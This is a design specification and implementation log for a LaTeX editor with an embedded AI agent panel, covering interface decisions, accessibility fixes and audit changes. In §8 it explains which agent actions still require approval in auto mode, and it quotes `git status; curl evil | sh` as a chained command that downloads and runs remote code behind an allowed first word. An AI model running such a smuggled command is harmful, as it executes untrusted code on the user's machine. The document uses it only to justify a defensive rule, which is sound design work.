never blanked, never shows a loading state, and never returns to page 1.

## 7. Three things deliberately not done

**1. No loading indicators for compiles.** The default is a spinner or skeleton the instant
a build starts, plus a green checkmark when it lands. Neither is here. Compiles take ~1 s,
and a spinner shown at 0 ms on a 1 s task is what *tells* the user the task is slow, it
converts an imperceptible wait into a watched one. Instead the dot changes colour in the
same frame, the PDF keeps showing the last good render, and a 2 px hairline appears only if
the build crosses 400 ms. Success is monochrome, because a green checkmark firing on every
debounced rebuild becomes noise within an hour.

**2. No full-width bottom console with `Problems | Output | Terminal` tabs.** That is the
VS Code shape and it arrives by reflex in every editor-like brief. It is wrong here: it
takes height from the PDF, which is the entire point of the right half of the screen, and it
separates an error message from the source line it refers to by the full width of the app.
The diagnostics drawer is scoped to the editor pane, so error → line number → source → `Fix`
is one vertical eye path in one column.

**3. No chat bubbles, avatars, or a warm-cream-plus-terracotta document aesthetic.** The
agent panel is the highest-risk surface for looking generic: rounded bubbles, a circular
avatar, alternating alignment, a gradient send button. Instead the agent is set in a serif
at 68 characters behind a 3 px violet rule, with the *user's* message given the lesser
visual weight. Likewise the app is not cream-and-terracotta and not graphite-and-neon: it is
a proofing grey that exists to make the white page look white, with the accent borrowed from
hectograph violet, the ink theses were actually duplicated in.

Also cut, quietly: all-caps tracked eyebrow labels, `A · B · C` middle-dot meta strings, `→`
glyphs on buttons, monospace as decoration for small labels, and a single global
border-radius (0 for panes, 3 for rows, 5 for cards, the radius encodes what kind of object
you are looking at).

## 8. Deviations recorded during implementation

Each of these departs from the specification above. They are written down
rather than left implicit, so the next person to read both can tell a
decision from a drift.

**Two animations repeat without being asked, not one.** §10 claims the breathing
compile dot is the only one. The agent's activity dot is the second, and for the same
reason: a turn can spend twenty seconds inside a tool with nothing arriving in the panel,
and a still indicator beside a still transcript is indistinguishable from a turn that has
stopped. It pulses at 1400 ms, slower than the compile dot, because it sits beside the
agent's name for the whole of a turn rather than for a second, and it stops entirely under
`prefers-reduced-motion`.

**The 350 ms input shield is visible.** §5 says the buttons ignore clicks "at full opacity,
with no visible change". As built they fade in over the shield. The argument for the
original is that a dimmed button invites a wait; the argument for what shipped is that a
button which looks live and does nothing is the more confusing of the two failures, and the
shield exists precisely because a card can arrive under a cursor already moving. Recorded
as it is, deliberately.

**The `Allow` label is white on light and ink on dark.** §5 specifies `#FFFFFF`. White on
the dark theme's `--pen` measures 2.57:1 and fails; dark ink on it measures 6.20:1. The
build is right and the specification was wrong. The same applies to any filled `--pen`
button in the dark theme.

**Filled `--pen` is conditional on Send.** §10 says filled violet is "`Allow` and `Send`
only". Send carries the fill only when the composer has something in it; empty, it is a
ghost. That is the rule as it should read: the fill marks the action that is available,
not the button that is present.

**The agent's `⋯` opens a drawer, not a popover.** The file row's menu overlays the tree;
this one pushes the transcript down. They differ because the transcript is pinned to its
bottom and a popover over it would cover the newest turn, the thing most likely to be
being read. It matches the Usage panel directly above it, which is the surface it sits
next to, and both are dismissed the same way.

**The source/preview toggle below 900 px lives in the tab bar**, not the status strip as §4
says. It is a view switch, and the tab bar is where this app puts view switches. Its
selected state is `--hint`, per §10.

**There is a filter box after all.** §5 said there would not be one: "tree type-ahead does
that job for nothing, and a thesis has tens of files, not thousands." That reasoning holds
for a thesis the writer is holding in their head, and stops holding for one reorganised
over a year. Type-ahead can only jump to a name you can already spell from its first
letter, in a tree you can already see; it cannot answer *where did the o-nitrophenol figure
end up*. The box was asked for by the writer using the app daily. It costs one 26 px row,
shown only when the magnifier is pressed, and type-ahead is kept exactly as it was for the
keyboard path.

**The permission fence has a switch.** §5's permission card is written as though a card is
unconditional, and for the actions that matter it still is. But a card for every action is
how a card stops being read, the same argument this document already makes for waving
read-only tools through, and a writer who has approved the same build command forty times
is being trained to click *Allow* without looking. Auto mode is therefore offered, and the fence stays up in four
places: a write outside the project root, because that is the one action that leaves the
thing the writer pointed the agent at; a file inside the project that the build executes,
because approving the writing is not approving the machinery that runs it; a shell command
carrying syntax no first-word rule can describe, because `git status; curl evil | sh` starts
with `git`; and anything that leaves the machine, because the address and the payload are
both chosen from files that may have arrived from somebody else. Two further things hold it
honest: every automatic approval is still emitted as a card that arrives already answered, so
nothing vanishes from the record; and while the mode is on a persistent `--warn` **Auto**
chip sits beside the agent's name, because a fence that is down and silent is worse than no
fence.

**A card that stops has to say which rule stopped it.** This was the half that was missing,
and it was reported by the writer rather than found by reading: with the switch on, auto mode
would simply stop, and nothing on the card said why. Worse, the card was often describing a
different rule. A write to a `latexmkrc` was announced as a write outside the project, which
is false twice over, since the file is inside the project and the rule that held it back was
the one about files the build runs. And a command carrying shell syntax was explained with
"it runs more than one command", which is true of four of the seven characters and false of
the other three: `latexmk > build.log` runs one command. Each card now works out for itself
which rule put it up, from the same facts the fence used, and says so in the writer's terms.
The reason line is empty when the switch is off, because then the answer is that this app
asks before it acts, and printing that on every card is how people learn to stop reading
them. The same
change made the rules from *Allow always* visible too: those were previously allowed in
silence, which was the same hole, unnoticed.

**Fonts are self-hosted, not loaded from Google Fonts.** §3 says "Google Fonts
only". NextTex is a self-hosted tool that people run on a private tailnet, and
often on a machine with no route to the public internet; a stylesheet from
`fonts.googleapis.com` would make the app's typography depend on Google being
reachable, and would tell Google every time someone opened their thesis. The
three families ship as `@fontsource` packages in the bundle. The typefaces and
their roles are unchanged.

**Proposed: what this specification would have to say to support touch, and
what it costs.** Written and not built, deliberately. The interface review
found that touch is not partially supported here, it is absent, and the
difference matters: a partial answer can be improved in place, and an absent
one is a decision about who the app is for. That decision belongs in this
document before any of it is coded.

What is actually there today, measured rather than estimated. **Zero** touch
handlers in the entire source. Three files handle `pointerdown`, all of them
for dragging a pane divider, and a pointer event from a finger arrives without
the hover that the affordance around it assumes. The smallest interactive
targets are 22 by 26 pixels, against the 44 by 44 that both platform
guidelines ask for. The preview's zoom is a `wheel` event with `ctrlKey` set,
which is a trackpad pinch and a mouse wheel and nothing a finger can produce.
The breakpoints above go down to 900 px and stop; below that the layout does
not reflow, it overflows, and there is no scroll fallback, so the right-hand
edge is simply unreachable.

The proposal, in the order the work would have to happen.

First, a stated minimum. This app is a two-pane editor with a third pane for
an agent, and there is a width below which that is not a layout, it is a
concession. Say 720 px, and below it give the shell a horizontal scroll rather
than a clip, so a narrow window is awkward and not broken. That is a small
change and it is the one that stops the current silent failure.

Second, hit targets, which is not a global size change. The rule would be that
anything a finger is expected to hit carries a 44 px touch area, through
padding or a pseudo-element, without the visual control growing. Applying it
everywhere would coarsen an interface whose density is the point; applying it
to the row menus, the tab close buttons and the preview controls is most of
the benefit.

Third, the gestures that have no keyboard or mouse equivalent. Pinch-to-zoom
in the preview is the only one, and it is `touchstart`/`touchmove` with two
points feeding the same zoom path the trackpad already uses.

Fourth, the pane dividers. A 3 px divider is a mouse target. On touch it needs
either a wider invisible grab area or, better, the folding controls that
already exist as the primary way to change the layout.

What is deliberately not proposed: a separate mobile layout, a phone-sized
breakpoint, or a rewrite of the shell. A tablet in landscape is the honest
target, because that is where a person edits a thesis and reads its proof.
A phone is not, and saying so is more useful than half-supporting one.

**Built, and four of the measurements above were wrong.** They are corrected
here rather than left, because the paragraph presents them as measured rather
than estimated, and a document that is wrong about its own numbers teaches the
next reader not to trust the rest.

There are no width media queries in the source CSS at all. The breakpoints are
JavaScript, in `layout.ts` now, and they are in shell units rather than
viewport pixels: the interface size is a `zoom`, so at 150 per cent a 1600
pixel window is a 1067 pixel shell and reaches them the way a much smaller
window would. Below 1400 the chat undocks, below 1100 the rail folds, below 900
the source and the preview take turns.

The smallest targets are not 22 by 26, which is the icon button size. The three
controls named above are smaller: the tab close button is 16 by 16, the file
tree row menu carries no size class at all inside a 16 pixel span, and the
preview zoom controls are about 13 by 16. Two of them are also `opacity-0`
until `group-hover`, which is a different and worse problem than being small:
on a device with no hover they are not hard to hit, they are invisible, and no
gesture reveals them. Those are gated on a `hoverable` variant now, so a mouse
sees them appear as before and a finger simply sees them.

The 44 pixel rule could not be applied flat. A file tree row is on a 22 pixel
pitch, so a 44 pixel tall invisible target centred on its menu would reach into
the rows above and below and take their taps, which is a worse bug than a small
control. The rule is therefore 44 on the axis with room and the row's own pitch
on the axis without it, through a pseudo-element, so no visible control changes
size and the density changes nowhere.

The clipping was at two layers, `body` and the shell, and the shell's is
deliberate: it clips with `overflow: clip` precisely so that nothing, including
a browser scrolling a focused element into view, can drag the window's frame
sideways. So the scroll fallback went outside it rather than into it. A shell
that cannot fit is wider than the frame around it and the frame scrolls, while
focus inside the shell still cannot scroll the shell. The minimum is a stated
number rather than `min-content`, which was tried and is wrong here: the
preview zooms to 300 per cent, and a zoomed page makes that pane's min-content
enormous, so the shell ballooned and the whole interface became horizontally
scrollable at high zoom. A pane that scrolls its own content must not be
allowed to set the width of the window it sits in.

The pinch feeds the zoom path the trackpad already uses, converted through one
tested function, so the limits, the frame coalescing, the redraw rationing and
the commit are all unchanged. One real difference is worth stating: a touch
gesture has an end event, and the settle delay exists only because a wheel does
not, so a pinch commits when the fingers lift rather than waiting out a timer
that is guessing.

The dividers were also mis-described. The vertical ones are a one pixel line
with a nine pixel invisible grab span, which is a comfortable mouse target and
a poor finger one, so it widens to twenty-four on a coarse pointer. Only the
diagnostics resizer was a bare three pixels, and it was a second copy of the
drag code that had never adopted the shared frame throttle. It uses the same
handle as the pane dividers now, with an axis.

The browser tier has a second project for this: a tablet-sized viewport with a
real touch pointer, running one spec. Not a spread of a device preset, because
those carry a WebKit browser type and this tier launches a pinned Chromium. All
three of its assertions were watched to fail against the interface as it was.

**Accepting an invite is a two-step answer, and the first step writes
nothing.** Joining used to sync the whole project, write every file, and
register it, and the first moment a person could look at what they had
accepted was after all of it was on their disk. Accepting an invite is
downloading somebody else's files, and vetting them is not an unreasonable
thing to want to do first.

So the join stops with the documents in memory and the connection held open,
and answers with the manifest: every path, its kind and its size. Accept
writes them and registers the project. Discard closes the connection and
removes the folder, which really does leave nothing behind rather than
deleting something written a moment earlier.

A file the build would run is listed as offered and marked as one that will
not be written, rather than being quietly left out. What somebody tried to
send is the more interesting of the two facts.

The connection cannot be held indefinitely: an unanswered join is discarded
after ten minutes by the same reaper that evicts idle sessions, and every
pending one is released when the server stops. A tab closed on the question
must not hold a peer connection open for the life of the process.

**A dialog keeps Tab, and gives focus back when it closes.** There was no Tab
handler anywhere in the source, so seven of the nine dialogs let Tab walk out
into the page behind them while they were still covering it, and dismissing one
left focus on `document.body`: the next Tab started from the top of the app
rather than from the control that had opened the dialog.

Both live in `useDismiss`, which every dialog already uses to close, so no
dialog had to ask for them. The trap is keyed on `role="dialog"` and nothing
else. A menu or a popover is not modal, and taking Tab away from the page
behind one would be a worse answer than the page behind it receiving Tab.

A dialog that opens with nothing focusable inside it still takes the caret,
through a `tabindex` of -1 on the panel, because otherwise the next key press
goes to the editor underneath.

Focus is given back on the way out, but only when nobody else has claimed it.
Restoring unconditionally is wrong and the browser tier said so: the file
tree's Rename item closes its menu and an inline input takes the caret in the
same gesture, so putting the caret back took it straight off again and the new
name was typed into nothing.

The one dialog this does not reach is the tutorial overlay, which does not use
the hook.

**There is a stack of transient messages, at the bottom of the shell.** §6 says
"no toasts". It carries save and download failures only, the cases where an
action the user took did not happen and nothing else on screen would say so. It
has no timer: a message stays until dismissed, because a failed save that fades
out is worse than no message at all.

A stack rather than one message, because for a long time it was one string and
thirty places wrote to it, so a second failure erased the first without a word:
two files refused in one drop, one message on screen. Each message has an
identity and its own dismiss control, and two identical messages in a row are
one event to somebody reading them.

The container is a `role="status"` live region and it is always in the
document, empty or not. A live region that appears at the same moment as its
content is not announced by every screen reader, and announcing these is the
whole purpose: they are the only report that something a person asked for did
not happen. `polite` rather than `assertive`, because none of them interrupts
what the writer is doing.

**Editor syntax highlighting is near-monochrome, and colour is opt-in.** The
specification does not cover token colours. By default, and this default is
unchanged: commands take `--ink` a step above the prose, comments `--ink-3`
italic, arguments and literals `--ink-2`, and no hue is introduced: the
rendered page sits two panes away and must stay the loudest object on screen.
"A step above" was a flat 600 until the prose weight became a setting; it is
`--nx-weight-strong` now, and in this mode weight is the only thing saying
which of two words is a command.

A per-machine setting (Settings → Highlighting → Colour) gives five families of
control sequence a hue each: sectioning, environments, mathematics, citations
and references, and the preamble. It exists because a chapter of LaTeX is far
easier to skim for its equations and its headings than for its words, and in one
ink it cannot be skimmed for either. Three things keep it from costing what §8
was protecting:

- It is off unless asked for, and off means off: every rule is gated behind
  a single class, so with the setting unset the decoration classes match no
  CSS whatsoever and the editor renders byte-identically to one built before
  the feature existed. The first version instead set each family to an ink,
  which requires knowing exactly what the LaTeX mode does to every token,
  and it does not do one thing. `\begin`, `\cite` and `\label` are `stex`
  plugins whose braced argument is an `atom` at `--ink-2`; `\section` is not
  a plugin, so its heading is plain text at `--ink`. One rule for "the
  argument" dimmed every heading in the untouched mode.
- The five hues sit at one lightness and one chroma ceiling per palette, so
  they read as one family rather than as a rainbow, and each is defined in
  both `.nx-theme-light` and `.nx-theme-dark`: the editor's own theme carries
  them, so a white page in a dark shell gets the light palette's colours.
  `contrast.test.ts` certifies every one against `--surface` in both.
- **A keyword must never melt into the prose**, which is the writer's own
  rule and the one the light palette broke for a year: "they should color
  match to the theme but when the focus is on the text, the keywords should
  be differentiated enough from normal text and vice versa." It is a rule
  about the *text*, not the paper, and that distinction is the whole story
  here. On a light page the prose is a near-black ink, so raising contrast
  against the page means going darker, which moves a colour **toward** the
  words it has to stand out from. The families sat at OKLab lightness 0.45,
  then briefly at 0.40, and both were rejected as melting in, at 0.40 a
  coloured command stood 22.6 L\* clear of the prose where even `--ink-3`
  stands 27.3 clear, while measuring a comfortable 7.0:1 against the paper.
  Contrast was never the axis.
- **Colourfulness is chroma weighted by lightness, and that is what the
  tests measure now.** `#18448C` carries a chroma of 0.129, more than the
  dark theme's blue, and still reads as navy-dark rather than as blue,
  because a saturated near-black is not a colour whose hue anyone can see.
  So the palette went to lightness 0.52 with the chroma ceiling removed
  entirely, each hue taking the most sRGB will give it there: 0.213 for the
  blue and 0.208 for the red against 0.115 before, standing 34–39 L\* clear
  of the prose where the dark theme manages 14–18. `contrast.test.ts` scores
  chroma × L\* and holds the floor just under what this palette measures;
  the two rejected ones score 0.021 and 0.028 against its 0.040 and dark's
  0.079. In every light palette the weakest is the teal, which sRGB starves
  at any lightness a light page can use.
- **These five are held to 4:1 rather than 4.5:1, deliberately, and it is
  the only such exemption in the file.** They measure 4.1–4.9:1 on the
  proofing grey and 4.8–6.1:1 on the three papers. Three things make the
  trade defensible here and nowhere else: colouring is off by default, so
  nobody is given it without asking; it is never the only carrier, because a
  control sequence is set 200 weights above the prose whatever this setting
  says, so removing the colour entirely leaves the file legible, which is
  the condition WCAG actually asks for; and it applies to control sequences,
  a fixed vocabulary five to fifteen characters long, not to running prose,
  which is still 14.4:1 and untouched. The floor is 4:1 rather than absent
  so that the next change has to be as deliberate as this one.
- **The choice was made by looking, not by arithmetic.** Five candidates
  were rendered as real source on all four light pages and the writer picked
  one. Every number above is a justification of that choice or a guard on
  it, not the thing that produced it.
- None of them is violet. `--pen` means the agent touched this line and is the
  one accent that appears near the text itself; the test asserts 35° of hue
  clearance from it, so a heading can never be mistaken for an edit. The other
  four accents appear inside the editor only as gutter bars, dotted underlines
  and washes, never as the colour of text, so the syntax hues share a
  channel with none of them.

The families are decided by command name in `latex-families.ts` and applied as
a `ViewPlugin` decoration, not as a `HighlightStyle`: the `stex` mode reports
every control sequence as one token, so a style keyed on token types cannot
tell `\section` from `\cite` however many colours it is given. Inline `$...$`
is decorated too, since it is the one form of mathematics that carries no
command to key on. Names outside the five lists take the ordinary command
styling rather than a guessed family.

**Spell checking, off by default.** The specification does not mention it.
CodeMirror sets `spellcheck="false"` on its content and is right to: a LaTeX
file is mostly not English, and the browser's own checker underlines every
package name, citation key, label and environment. A checker that marks
those teaches the writer to ignore every mark it makes, which is worse than
having none.

So the work is in deciding what is prose. `spell-scan.ts` subtracts rather
than adds, and the set it subtracts is: comments; control sequences
themselves; inline and displayed mathematics; optional arguments, which are
always keys, lengths or placements; the braced argument of every command
whose argument is a name rather than a sentence; `\verb` and whatever
delimiter it chose; and everything inside an environment that is not prose
at all, the maths environments, `verbatim`, `lstlisting`, `minted`,
`tikzpicture`, which is tracked across lines, because an `\end{align}` may
be a long way below its `\begin` and a per-line scan cannot see that. What
is left is checked. Words shorter than three letters and words in full
capitals are passed over as well: an acronym is spelled by its initials and
no list holds it. The distinction that matters is
not which family a command belongs to: `\section{...}` and `\caption{...}`
take prose and are checked, because a typo in a heading is the one a writer
most wants caught, while `\begin{...}` and `\label{...}` never do.

Three constraints shaped the rest:

- **Nothing ships until it is asked for.** The checker sits in a
  `Compartment` that is empty until the setting is turned on, so neither it
  nor its word list is in the interface bundle. The list is 98 kB brotli'd
  and is fetched once, on first use. `bundle.initial_kb` still rose about
  four kilobytes for the switch and the editor's side of it, and the budget
  was raised deliberately rather than quietly, see `bench/thresholds.json`,
  which now says why.
- **The writer's own words are the feature.** A dissertation is full of
  terms no list holds, so a right-click on an underlined word accepts it
  permanently, into `.nexttex/dictionary.txt`: machine-local and
  uncommitted, like every other piece of per-project state here, and plain
  text so two hundred species names are a paste rather than two hundred
  clicks.
- **It is not a diagnostic.** A dotted underline in `--ink-3`, no gutter bar
  and nothing in the diagnostics drawer. Red and amber mean the build is
  wrong; three hundred spellings in that drawer would bury the two compile
  errors that matter.

There are no suggested corrections. Ranking candidate spellings is a real
algorithm and a real interface, and neither is what was asked for.

**The status strip adapts to its own width by dropping segments.** §5 requires
that the strip never reflow. The editor pane is resizable down to 420 px, where
all six segments cannot fit on one line. Rather than wrap, segments drop out in
reverse order of value, the file path first, since the tab above already names
it, then the preview scope, through container queries on the strip itself.
Every remaining segment keeps its reserved width, so nothing shifts as digits
change.

**A `Hide` control on the slide-over.** §4 describes the Claude panel becoming a
slide-over below 1400 px but not how it is dismissed; without one it covers the
PDF permanently. Below that width the tab bar carries a `Claude` button and the
panel a `Hide` link, and the panel animates on `translateX` at 180 ms as
specified.


## 9. Revision two

The first implementation was reviewed against sections 1–8 and the findings
acted on. What follows is what the design gained afterwards, at the writer's
direction: *"add a splash of colour and subtle animations where necessary to
give hints to the user… tune the colour palette towards the darker side… give
the user two options, one light and one dark… all panels should be resizable
and collapsible… the user should be able to see their usage stats and change
the model on the agent panel… all projects start blank."*

**A second accent, `--hint`, with one job.** `--pen` still means *Claude
touched this* and nothing else. `--hint` is for live and interactive state that
is not the agent: the `Stop` control while a turn is running, a control the eye
is meant to find. It is a desaturated teal at roughly 185°, a hundred degrees
from the pen, so the two never read as the same signal.

**Motion is a hint, never decoration.** Four primitives, all inside the 0/90/
120/180 ms budget: `.nx-hover` (90 ms colour on interactive rows), `.nx-press`
(a 1 px depress on click, so a button feels answered), `.nx-pane` (180 ms width
change when a panel folds, so it is clear where it went), and `.nx-arrive`
(120 ms, 3 px rise, for something that appeared because you asked for it:
the usage panel, the welcome message). `prefers-reduced-motion` reduces all of
them to an opacity change.

**Every panel folds, and says where it went.** The file list, the source, the
preview and the Claude column each have a fold control; a folded panel leaves a
26 px strip carrying its name vertically, which is both the evidence that it is
folded and the control that brings it back. Source and preview are mutually
exclusive: folding one gives the other the whole middle, and folding both
would leave nothing to work in. Fold state is remembered per project.

**The preview reads two ways.** A `Scroll` / `Page` toggle in the PDF bar. The
scrolling view is the default and is built for rebuilds: page elements and
their canvases are *reused* when a rebuild produces the same page count and
geometry, so a recompile redraws only the pages actually on screen instead of
recreating the document. Scroll handling is coalesced to one pass per animation
frame, and a canvas keeps its previous render until the new one is ready, so
the pane never blanks. Page mode keeps a single page in the flow and answers
the arrow keys.

**The agent column carries its own instruments.** A model selector (default,
Opus, Sonnet, Haiku) that takes effect on the next question, the conversation
resumes by session id, so changing model does not lose the transcript, and a
usage readout: turns, estimated cost, tokens sent, written and read from cache,
and model time, counted per project and kept across restarts. Cost is labelled
as an estimate, because on a subscription it is not a bill.

**New projects are blank.** One empty document, an empty bibliography, a
figures folder. A journal class, a university handbook and a lab report agree
on nothing, so NextTex does not guess: the way to shape a project is to upload
the real template and let the agent read it.

**The agent speaks first.** A project with no conversation shows a message from
Claude, written into the app, not generated, covering the three panes, what
the agent can and cannot do without asking, how to tailor the project with a
template, and how to teach it the writer's voice. It is the app's only
onboarding, and it is set as the agent's own prose because the agent is what
does all of it.


## 10. What the second audit changed

The built interface was audited as a whole, visual design, information
design, interaction, wording, accessibility, against §§1–9 and against real
renders in both themes. The audit's own summary is that four things carried
most of the damage; all four are fixed, along with most of the smaller
findings.

**The transcript is now durable, and that is architecture, not polish.** The
model resumes its own memory of a conversation from disk, so a panel that
started empty meant the agent could refer to work the writer could not see.
More importantly, §5 promises that the chat is a record of what was done to
the document, every diff, every reverted edit, every command allowed or
refused, and a record that survives one session is not a record. Events are
now written to `.nexttex/transcript.jsonl` as they are broadcast, with
streamed text coalesced into whole messages, and replayed when the project is
reopened. A permission still unanswered when the window closed replays as
denied, because the turn that was waiting on it is gone.

**Folding the file list no longer strands anything.** The project name, the
switcher, the theme toggle and the downloads move into whichever header is
still on screen: the tab bar, or the preview header when the source is
folded too.

**The surfaces have their specified separation.** The steps had been built at
roughly half the distance the palette called for, and `--line` sat at 1.5:1,
so panes had no visible edges, drag handles were invisible, and a selected
segment was indistinguishable from an unselected one. The steps are now 5–7
L\* apart in both themes and `--line` clears 3:1. `--ink-3` was below 4.5:1 on
`--surface-2`, the surface most of the app's metadata actually sits on, and
is now 5.2:1 in both.

**Green means the preview is current.** §5 says a clean build renders in no
colour at all, and §7 argues that a green tick firing on every debounced
rebuild becomes noise within an hour. That argument is about a *success
flash*; the dot is a *resting state*, and the two are different objects.
Green here does not fire: it sits, for hours, and says the picture beside
the text is the text. What fires is the departure from it: the dot goes
`--warn` on the first keystroke after a build and stays there until the next
one lands. Colour now answers one question, does the preview match the
source, and the label beside it answers the other, which is what the last
build had to say. `--ok` therefore carries a fourth job beyond git, diffs and
resolved permissions.

**Warnings no longer colour the dot.** §5 gave `--warn` to chktex counts. It
now means the preview is behind, in both the stale and the compiling states.
A document with warnings and a current preview shows a green dot and the
label `2 warnings`, which is accurate on both counts: nothing is out of date,
and there are two things to read if you want them. Warnings keep their
`--warn` severity bar in the diagnostics drawer, and their gutter bar in the
editor when the writer has that switched on.

**The compiling dot breathes, and it is the only animation in the app that
repeats without being asked.** §6 lists every status strip dot change under
*does not animate*, and §7 says there are no spinners anywhere. Both stand,
with one exception written down here: a build that has already run for 400 ms
is the one case where the strip has to say *still working* rather than *this
is the state*, and the 2 px hairline that used to say it swept the full width
of the strip, in the corner of the eye, for as long as the build took. The
dot breathes instead, opacity 1 → 0.32 over 700 ms, alternating, on the
app's single curve: on the same 400 ms threshold the hairline used, so a
130 ms build still shows nothing at all. Under `prefers-reduced-motion` it
becomes a hollow `--warn` ring, the same disc-versus-ring distinction the
idle dot already uses, for the same reason the hairline became a static bar.
The sweeping hairline itself survives, on the one operation that genuinely
takes minutes: installing an update.

**The underline points at a token, or there is no underline.** §4 already
says the gutter carries the news and the writer comes to the detail. A dotted
rule under a whole line of LaTeX was not pointing at anything the gutter bar
had not already said, and it was drawn through text somebody was trying to
read. It now covers the token at the column the tool reported, and where
there is no usable column, every compile error, since the LaTeX log has none
, the gutter bar is the whole in-text signal.

**Two drifts, recorded rather than fixed.** `--line` composites to about
2.4:1 in light and 2.6:1 in dark against the surfaces it sits on; the note
below claiming it "clears 3:1" has not been true since the mix was set at
55%. Raising it to about 68% would make the claim true and visibly thicken
every border in the app, which is a separate decision from this one. And this
table's `--pen` values had drifted from the stylesheet's twice before this
revision, which is why the contrast test now parses the palette out of
`styles.css` rather than trusting anything written here.

**`--pen` is back to meaning one thing.** It had spread to eight filled
buttons, of which five had nothing to do with the agent; the loudest object in
the light theme was a GitHub setup button. Filled violet is now `Allow` and
`Send` only: answering the agent, or addressing it. Everything else is a
ghost button that takes `--hint` on hover, which is also now on the drag
handles, the segmented controls, the chip actions and the fold controls: the
jobs the second accent was invented for.

Also: the welcome message is three paragraphs with its two instructions as
buttons that do the thing, rather than five paragraphs of prose pointing at a
grey row; the usage panel leads with one number instead of a 2×3 grid in four
units; the edit chip shows `Show` and `Undo` without waiting for a hover, and
no longer sits under a tool row saying the same thing; the permission card has
a `--warn` focus ring, because a card that answers bare keypresses must show
that it has focus, and both that ring and the ordinary `--pen` one are 2 px
rather than 1, WCAG 2.2's focus appearance asks for it, and it is the one
place this interface's taste for hairlines was working against the person
using it, since a 1 px ring at 1 px offset is a hairline in a design full of
hairlines; the file tree is one tab stop with arrow-key navigation
rather than forty; diagnostics say "2 errors, 1 warning" instead of "3
findings", which also stops severity being carried by colour alone; the
preview can fit a whole page; and reduced motion now makes the compile
indicator and the SyncTeX highlight *static* rather than fast, which was the
point of both.


## 11. Where the writing instructions live

Two things shape the prose the agent produces, and they are deliberately kept
apart.

The **system prompt** carries a long section on writing that does not read as
machine-written: lead with the claim, prefer the specific number to the
careful phrase, vary sentence length and opening, put a real subject early,
and stop rather than restating the paragraph's first sentence in different
words. It also names the tells outright, *delve*, *underscore*, *robust*,
*It is important to note*, *plays a crucial role in*, stacked
*Moreover/Furthermore*, paired near-synonyms, because a general instruction
to write naturally does not survive contact with a first draft. It is
explicit that swapping a banned word for a synonym fixes nothing.

The **voice description**, when the writer has uploaded samples of their own
work, outranks all of that. It is distilled once into eight headed sections,
sentence length ranges, paragraph shape, person, the exact hedging words,
connectives, characteristic vocabulary, how terms and citations are
introduced, and what the author never does, and the prompt says plainly that
where the two disagree the author wins, including where the author does
something the general guidance discourages. A document is supposed to sound
like its author, not like a house style. The precedence note is added to the
prompt only when a voice summary exists, so nobody pays for it who has not
uploaded a sample.


## 12. Version history, a trash, and completion

Added at the writer's request, after the second audit. Three of these are
new surfaces; the rest are corrections to old ones.

**History is browsed inside the editor.** A 264 px panel overlays the right
edge of the editor pane: an overlay rather than a fourth column, so opening
history does not reflow the preview and lose the reader's place in the PDF.
Versions are grouped by day, because "some time on Tuesday" is how people
remember losing a paragraph, and each row carries the time, who made it, the
reason or the label, and the size. Selecting one puts the editor into a
read-only viewing mode with a 26 px banner at the top of the pane, inside the
editor rather than floating over it.

The one unacceptable failure in this feature is autosaving historical text
over the live file, and it is closed three independent ways: the historical
text is loaded into a state built from a *different extension set with no
update listener at all*, so no dispatch of any kind can arm a save;
`EditorState.readOnly` and `EditorView.editable` are the second and third
locks; and the live `EditorState` is never touched, which is also why undo
history and cursor come back intact rather than being saved and restored.

**Show changes** shades lines that are in the old version and not in the file
as it stands, using `--error` at 12 % with a 2 px inset bar. Error red rather
than a neutral wash on purpose: what you deleted is what you came looking
for.

**The trash is a section under the file tree**, appearing only when it holds
something. Deleting asks nothing, the file moves to the trash with its
history and the count goes up, because a confirmation before an action that
is one click from being undone is friction for nothing. Deleting *from* the
trash asks, in the app's own type, because that one is final.

**Autocomplete belongs to the project, not to LaTeX.** Citation keys carry
their author and year; labels carry the file they are defined in; the
writer's own `\newcommand` macros are offered before the built-in list and
marked `yours`. The popup is themed to the app, `--surface` on `--line`,
the selected row on `--hint-wash`, so it does not read as a stock editor
widget dropped into a designed application.

**Equation previews** render with KaTeX on hover, lazily imported so nobody
who never writes maths pays 260 KB for it, with the project's own macros
passed through as KaTeX macros. `\npistar` renders as the notation it stands
for rather than as an error.

**The mark.** A sheet of paper with its corner turned, notched on the left so
the negative space reads as a chevron, next. Hectograph violet on the tile,
paper white inside, drawn on a 32-unit grid and checked at 16 px. It is
inlined into the HTML as a `data:` favicon rather than served as a file,
because the server routes every unknown path to the app shell and a
`/logo.svg` would come back as HTML.


## 13. What the third audit changed

The new surfaces were audited against §§1–12 with real renders in both
themes. What it found, and what was done:

**The history panel now docks rather than overlays**, whenever the editor is
wider than 700 px. As an overlay it covered the right third of every wrapped
LaTeX line, so the file could not be read while the panel comparing it to its
past was open, which defeats the panel. Below that width it still overlays,
now on `--surface-2` so the plane change is legible without depending on a
hairline. It also keeps your place: entering a version anchors to the line
you were on rather than resetting to the top, because the old version is a
different length and a pixel offset would land somewhere else entirely.

**The banner is unmistakably not the tab bar.** It had been `--surface-2`,
the tab bar's own fill, directly above it, announcing the most consequential
state in the editor in the same colour as more toolbar. It now takes a
`--hint` top rule and a tinted fill, `--pen-wash` when the version is
Claude's. Escape leaves. Every path that closes the panel also leaves viewing
mode, which the status strip's toggle did not, and `Restore this`, the only
mutating action available in a read-only mode, confirms in place like every
other destructive action in the app.

**"Show what's gone" is a real diff.** It had been set membership: does this
line appear anywhere in the new text. LaTeX is full of repeated lines, so
deleting a figure block left `\centering` and `\end{figure}` unshaded and the
eye got a comb where it needed a block. It is now an LCS diff, and the label
says what it actually shows: the old version's deletions, since additions
since are invisible by construction. The 2 px error-coloured gutter bar is
gone: it was the same shape, colour and position as a diagnostic marker.

**One stray `$` no longer breaks every equation preview after it.** Dollar
pairing ran over the whole document, so a single unclosed delimiter, the
commonest LaTeX typo there is: inverted the pairing for everything below it:
hovering prose rendered maths, hovering maths rendered nothing. The scan is
now scoped to the paragraph under the pointer and says nothing when that
block is unbalanced, which is also what makes it cheap enough to run on every
pointer move.

**`.quiet` was silently repainting other elements' colours.** It is unlayered
and outweighs Tailwind's utilities, so `quiet … hover:text-error` on the
trash's Delete hovered to `--hint`, the colour that means *safe and
interactive*, and the preview's selected Fit width state was identical to
the unselected one. Tone is now carried by a `data-tone` attribute the class
respects.

**Smaller, all from the same pass:** one `--float` shadow token replaces three
hand-rolled recipes; the `main` tag lost its `--surface-3` chip, which was
under 4.5:1 in both themes and wore the pressed-state colour for a permanent
label; the trash reads like the file tree it hangs under, with 26 px rows,
stem/extension names and the same clock the history panel uses; `Create
project` is a ghost button, since the projects screen has no agent on it and
